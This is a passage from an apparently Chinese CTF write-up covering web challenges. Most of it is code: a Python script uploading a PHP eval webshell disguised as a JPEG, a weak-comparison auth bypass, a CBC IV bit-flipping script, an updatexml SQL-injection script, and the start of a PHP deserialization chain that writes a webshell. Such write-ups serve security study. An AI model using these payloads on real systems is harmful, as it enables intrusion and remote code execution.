class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://172.20.6.106&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundarywAeLpgB3HhSWqVLj&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://172.20.6.106/index.php&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>, <span class="string">&quot;x-forwarded-for&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">burp0_data = <span class="string">&quot;------WebKitFormBoundarywAeLpgB3HhSWqVLj\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;shell1.jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php\neval($_POST[&#x27;a&#x27;]);\n?&gt;\r\n------WebKitFormBoundarywAeLpgB3HhSWqVLj\r\nContent-Disposition: form-data; name=\&quot;name\&quot;\r\n\r\n2.jpg\r\n------WebKitFormBoundarywAeLpgB3HhSWqVLj--\r\n&quot;</span></span><br><span class="line">requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">burp0_data=&#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;system(&#x27;cat /flag.txt&#x27;);&quot;</span>&#125;</span><br><span class="line">r=requests.post(url+<span class="string">&quot;upload/2.jpg&quot;</span>, data=burp0_data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>



<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>浏览一遍代码后发现一个弱类型比较</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;token&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;  <span class="comment">//not login</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;token&quot;</span>] == <span class="string">&quot;0&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;   <span class="comment">//Administrator//0e绕过</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$key</span> = base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&quot;token&quot;</span>]);</span><br><span class="line">        <span class="variable">$user</span> = explode(<span class="string">&quot;|&quot;</span>, <span class="variable">$key</span>)[<span class="number">0</span>]; <span class="comment">//user</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$user</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果我们能令token以0e[0-9]+的格式的话，就可以绕过身份验证机制</p>
<p>而生成token的代码为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setUser</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$ip</span> == <span class="string">&quot;::1&quot;</span> || <span class="variable">$ip</span> == <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&quot;token&quot;</span>] = <span class="number">0</span>;     <span class="comment">//Administrator</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;修罗！隐忍！！！&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="variable">$username</span> . <span class="string">&quot;|&quot;</span> . <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;token&quot;</span>] = base64_encode(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为0e[0-9]+是在base64中的所以我们构造：<code>username=%D1%EDv%EF%BE&amp;password=%D7m%F8</code></p>
<p>至此获得admin权限</p>
<p>upload处有个任意文件上传，但是我们不知道admin的上传目录，我们不得不进行sql注入</p>
<p>notes.php处有个神奇的todo:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> = getCache();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> &amp;&amp; <span class="variable">$data</span>-&gt;contents == <span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$data</span>-&gt;username;</span><br><span class="line">        <span class="variable">$contents</span> = <span class="variable">$data</span>-&gt;contents;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$contents</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cache&#x27;</span>])) &#123;</span><br><span class="line">        setCache(<span class="variable">$username</span>, <span class="variable">$contents</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;缓存成功&#x27;);location.href=&#x27;index.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;cache&#x27;</span>);</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO notes (uid, contents, time) VALUES ((select id from users where username = &#x27;$&#123;username&#125;&#x27;), &#x27;$&#123;contents&#125;&#x27;, localtime())&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;提交成功&#x27;);location.href=&#x27;index.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">            <span class="comment">//<span class="doctag">TODO:</span>删掉</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们能控制$data-&gt;contents == $_POST[‘contents’]，且可以控制<code>$data-&gt;username</code>出现引号逃出引号的包围，就可以进行sql注入了。</p>
<p>而我们的缓存的加密函数是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CBCCrypt</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$iv</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$encryptKey</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;iv = <span class="string">&quot;cbcisfunsoisbase&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;encryptKey =  file_get_contents(<span class="string">&quot;secret.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$encryptStr</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$iv</span> = <span class="keyword">$this</span>-&gt;iv;</span><br><span class="line">        <span class="variable">$encryptKey</span> = <span class="keyword">$this</span>-&gt;encryptKey;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$encrypted</span>=openssl_encrypt(<span class="variable">$encryptStr</span>, <span class="string">&#x27;aes-128-cbc&#x27;</span>, <span class="variable">$encryptKey</span>, <span class="literal">true</span>, <span class="variable">$iv</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> base64_encode(<span class="variable">$iv</span>.<span class="variable">$encrypted</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$encryptStr</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$iv</span> = substr(base64_decode(<span class="variable">$encryptStr</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="variable">$encryptKey</span> = <span class="keyword">$this</span>-&gt;encryptKey;</span><br><span class="line">        <span class="variable">$encrypted</span> = substr(base64_decode(<span class="variable">$encryptStr</span>),<span class="number">16</span>);</span><br><span class="line">        <span class="variable">$decrypted</span> = openssl_decrypt(<span class="variable">$encrypted</span>, <span class="string">&#x27;aes-128-cbc&#x27;</span>, <span class="variable">$encryptKey</span>, <span class="literal">true</span>, <span class="variable">$iv</span>);</span><br><span class="line">        <span class="keyword">echo</span> openssl_error_string();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$decrypted</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中$iv是受到我们控制的</p>
<p><img src="https://image.3001.net/images/20180228/15198072135832.png!small" alt="image12048"></p>
<p>根据cbc加密的原理我们可以知道，通过修改iv从而修改初始的16个字符串</p>
<p>爆破合适iv的脚本:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strxor</span>(<span class="params"><span class="variable">$str1</span>,<span class="variable">$str2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$res</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$str1</span>)!==strlen(<span class="variable">$str2</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$str1</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$res</span>.=chr(ord(<span class="variable">$str1</span>[<span class="variable">$i</span>])^ord(<span class="variable">$str2</span>[<span class="variable">$i</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$enc</span>=urldecode(<span class="string">&quot;Y2JjaXNmdW5zb2lzYmFzZUDBRfKeIBJYWfSM2WOSqNOLdJ7UM1Nq%2B9zuKSrAr7O8%2B9AtpndZ00OlTIF0qmDsWw%3D%3D&quot;</span>);</span><br><span class="line"><span class="variable">$cipher</span> = substr(<span class="variable">$enc</span>,<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line"><span class="variable">$message</span> = substr(<span class="string">&#x27;&#123;&quot;username&quot;:&quot;fucker&quot;,&quot;contents&quot;:&quot;fucker&quot;&#125;&#x27;</span>,<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line"><span class="variable">$iv</span> = <span class="string">&quot;cbcisfunsoisbase&quot;</span>;</span><br><span class="line"><span class="variable">$before_xor</span>=strxor(<span class="variable">$message</span>,<span class="variable">$iv</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="string">&quot;cbcisfunsoisbas&quot;</span>.chr(<span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$result</span> = strxor(<span class="variable">$iv</span>,<span class="variable">$before_xor</span>);</span><br><span class="line">    <span class="keyword">if</span>(strpos(<span class="variable">$result</span>,<span class="string">&quot;&#x27;&quot;</span>)!==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(<span class="variable">$iv</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>.<span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">session,username</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://100.100.1.5:80/ctf/register.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://100.100.1.5&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://100.100.1.5/ctf/register.html&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;fuc&quot;</span>+username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;fucker&quot;</span>, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;\xe6\xb3\xa8\xe5\x86\x8c&quot;</span>&#125;</span><br><span class="line">    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;注册成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cache</span>(<span class="params">session</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://100.100.1.5:80/ctf/notes.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://100.100.1.5&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://100.100.1.5/ctf/index.php&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;contents&quot;</span>: <span class="string">&quot;fffffffffffffffffffffffffffffffffff&quot;</span>, <span class="string">&quot;cache&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;缓存成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span>(<span class="params">session,cookies</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://100.100.1.5:80/ctf/notes.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://100.100.1.5&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://100.100.1.5/ctf/index.php&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;contents&quot;</span>: <span class="string">&quot;fffffffffffffffffffffffffffffffffff&quot;</span>, <span class="string">&quot;submit&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    session.cookies = requests.utils.cookiejar_from_dict(cookies, cookiejar=<span class="literal">None</span>, overwrite=<span class="literal">True</span>)</span><br><span class="line">    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data,cookies=cookies)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqlinj</span>(<span class="params">sql</span>):</span></span><br><span class="line">    reg(session,sql)</span><br><span class="line">    cache(session)</span><br><span class="line">    cookie = session.cookies.get_dict()</span><br><span class="line">    cookie[<span class="string">&quot;cache&quot;</span>]=urllib.parse.quote_plus(<span class="built_in">str</span>(base64.b64encode(<span class="string">b&quot;cbcisfunsoisbas\x21&quot;</span>+base64.b64decode(urllib.parse.unquote(cookie[<span class="string">&quot;cache&quot;</span>]))[<span class="number">16</span>:]),encoding=<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(cookie)</span><br><span class="line">    r=submit(session,cookie)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">sql=<span class="string">&quot;or(updatexml(1,concat(0x7e,(select upload from users where username=0x61646D696E),0x7e),1))),0x666666666666,localtime())#dd&quot;</span></span><br><span class="line">r=sqlinj(sql)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;提交成功&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>





<p>上传名为file的文件，得到config/admin/secretpath/profile</p>
<p>结合<code>include &quot;config/$&#123;_SESSION[&#39;token&#39;]&#125;/profile&quot;;</code>从而getshell</p>
<p>token是base64编码，因此可以精心构造出admin/secretpath</p>
<p>由于没有题目环境便无法验证</p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>网络上找到了一个payload:<a target="_blank" rel="noopener" href="http://igml.top/2020/08/21/2020-ciscn/">http://igml.top/2020/08/21/2020-ciscn/</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">Jig</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">db</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$file</span> = <span class="string">&#x27;gmmml.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$document</span> = <span class="string">&#x27;&lt;?php @eval($_POST[gml]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$db</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Jig</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">format</span> = 0;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$dir</span> = <span class="string">&#x27;./&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span 